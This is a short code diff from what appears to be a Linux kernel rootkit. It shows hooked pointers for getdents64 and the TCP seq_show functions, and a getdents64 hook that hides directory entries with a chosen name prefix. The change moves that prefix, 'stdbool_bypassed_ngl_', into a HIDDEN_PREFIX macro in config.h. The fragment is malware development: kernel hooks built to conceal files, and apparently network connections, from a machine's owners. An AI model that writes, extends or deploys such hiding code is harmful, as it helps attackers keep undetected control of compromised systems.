@@ -2,6 +2,8 @@
 
 #include "hide_api.h"
 
+#include "config.h"
+
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
 asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
@@ -60,7 +62,7 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     unsigned int new_size = ret;
     unsigned int new_off = 0;
 
-    const char prefix[] = "stdbool_bypassed_ngl_";
+    const char prefix[] = HIDDEN_PREFIX;
     size_t prefix_len = strlen(prefix);
 
     // Loop through the entries in the buffer
